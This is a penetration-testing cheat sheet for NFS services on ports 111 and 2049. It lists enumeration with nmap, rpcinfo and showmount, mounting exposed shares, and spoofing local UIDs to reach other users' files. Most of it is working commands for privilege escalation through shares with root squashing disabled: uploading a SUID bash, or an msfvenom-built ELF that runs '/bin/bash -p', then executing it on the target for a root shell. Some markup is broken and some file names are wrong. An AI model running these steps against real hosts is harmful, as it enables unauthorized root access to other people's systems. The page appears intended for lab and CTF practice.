# 111, 2049 - NFS

**NFS** is a server/client system enabling users to share files and directories across a network and allowing those shares to be mounted locally. While both useful and versatile, NFS has no protocol for authorization or authentication, making it a common pitfall for misconfiguration and therefore exploitation.

{% hint style="danger" %}
If you mount a folder which contains files or folders only accesible by some user (by UID). You can create locally a user with that UID and using that user you will be able to access the file/folder. The mount shows user and group id for everything. If it does not show a user or group on my host/VM, there is no user with that id.

```bash
# Create a user 
sudo adduser testuser
# Assign a UID to that user
sudo usermod -u 9999 testuser
# Assign a GID to that user
sudo groupmod -g 9999 testuser
```
{% endhint %}

If we mount NFS share and see user 1000 or group 1000 or any other -> edit our UID/PID on /etc/passwd and /etc/groups
to match it, then we will be able to access it or write files and if so, try to place SUID files so from the target we could escalate privileges.

If we want to escalate to another user -> see /etc/passwd on the target to check UID/GID of that user ->
change our local user on our attacking machine to those values -> then write a setuid.c file as our local user ->
when we run that binary on the target, we will become the target user

root_squash configuration -> anything I do as root on my VM will be done as nobody on the target.
```
{% endcode %}
{% endhint %}

## Best method

```bash
nmap -sV -p 111 --script=rpcinfo $IP

# If we see service nfs:
nmap -p 111 --script nfs* $IP

# Then we mount the directory we see. -o vers=2 might be necessary to use version 2
mkdir /tmp/mount
sudo mount -t nfs [-o vers=2] $IP:$PATH /tmp/mount/ -nolock
cd /tmp/mount && ls

# If there are files with a specific UID:
sudo adduser test
# change UID of user to that specific by modifying /etc/passwd

# When we finish, we unmount the share:
sudo umount /tmp/mount
```

## Alternatives

{% code overflow="wrap" fullWidth="true" %}
```bash
root@kali:~ nc -nv 10.11.1.72 2049
(UNKNOWN) [10.11.1.72] 2049 (nfs) open

showmount -e $IP

mkdir /tmp/mount
sudo mount -t nfs IP:share /tmp/mount/ -nolock

################# EXPLOIT NFS
Bash executable https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->
Download the bash executable to your Downloads directory. 
Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. 
The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
sudo chmod +s bash
                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS

---------------------------
rpcinfo -p <IP>
showmount <IP> -a
mount 10.11.1.X:/sites/ ./testing
```
{% endcode %}

## Privesc

Files created via **NFS** inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

{% code overflow="wrap" fullWidth="true" %}
```bash
cat /etc/exports
# If there is a share with root squashing disabled, we can exploit it.

# If it is version 3 (or below??) check the option of uploading SUID root to achieve privesc

# Do this on your Kali machine as root:
mkdir /tmp/nfs
sudo mount -t nfs -o vers=2 10.10.10.10:/srv/exportnfs /tmp/nfs/ -nolock
mount -o rw,vers=2 $TARGET_IP:/$SHARE /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

# Now back to the victim machine, we execute the file to gain a root shell:
/tmp/shell.elf

# If we get this error
mount.nfs: requested NFS version or transport protocol is not supported
try -o vers=1/2/3
```
{% endcode %}
